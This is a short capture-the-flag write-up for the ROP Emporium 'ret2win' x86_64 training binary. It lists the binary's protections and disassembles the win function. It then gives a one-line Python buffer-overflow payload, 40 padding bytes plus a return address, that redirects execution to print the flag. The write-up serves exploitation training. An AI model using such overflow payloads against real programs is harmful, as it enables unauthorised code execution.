# ROP Emporium - 01 ret2win x86_64

## ELF Binary Info
> $ `rabin2 -I ./ret2win`  
```
arch     x86
baddr    0x400000
binsz    6739
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Get Return Address
> $ `rabin2 -z ./ret2win | grep /bin/cat`  
```
8   0x00000943 0x00400943 17  18   .rodata ascii /bin/cat flag.txt
```
> $ `objdump -M intel --disassemble=ret2win ./ret2win`  
```
[...]
0000000000400756 <ret2win>:
  400756:	55                   	push   rbp
  400757:	48 89 e5             	mov    rbp,rsp
  40075a:	bf 26 09 40 00       	mov    edi,0x400926
  40075f:	e8 ec fd ff ff       	call   400550 <puts@plt>
  400764:	bf 43 09 40 00       	mov    edi,0x400943
  400769:	e8 f2 fd ff ff       	call   400560 <system@plt>
  40076e:	90                   	nop
  40076f:	5d                   	pop    rbp
  400770:	c3                   	ret
[...]
```

## Get Flag
> $ `python -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x64\x07\x40\x00\x00\x00\x00\x00')" | ./ret2win`  
```
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

